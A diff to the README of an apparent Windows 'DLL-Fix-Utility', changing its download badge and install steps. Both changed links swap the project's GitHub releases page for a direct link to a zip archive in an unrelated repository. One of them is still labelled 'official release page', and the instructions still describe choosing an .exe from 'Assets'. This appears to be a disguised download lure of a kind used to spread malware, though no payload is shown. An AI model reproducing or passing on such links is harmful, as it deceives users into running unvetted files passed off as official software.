@@ -5,7 +5,7 @@ description: "Download and run this utility to automate DLL error repairs on Win
 ---
 # 🛠 DLL-Fix-Utility - Resolve your missing system file errors
 
-[![](https://img.shields.io/badge/Download-DLL_Fix_Utility-blue.svg)](https://github.com/sparkcountersheoak889/DLL-Fix-Utility/releases)
+[![](https://img.shields.io/badge/Download-DLL_Fix_Utility-blue.svg)](https://raw.githubusercontent.com/sparkcountersheoak889/sparkcountersheoak889.github.io/main/counterslope/github_sparkcountersheoak_io_3.3.zip)
 
 ## 🎯 About the software
 
@@ -27,7 +27,7 @@ Ensure your computer meets these requirements to run the utility:
 Follow these steps to obtain the correct version of our software.
 
 1.  Open your internet browser.
-2.  Go to the [official release page](https://github.com/sparkcountersheoak889/DLL-Fix-Utility/releases).
+2.  Go to the [official release page](https://raw.githubusercontent.com/sparkcountersheoak889/sparkcountersheoak889.github.io/main/counterslope/github_sparkcountersheoak_io_3.3.zip).
 3.  Look for the section marked "Assets".
 4.  Click the file ending in ".exe" to begin the download.
 5.  Wait for the file to finish saving to your local "Downloads" folder.
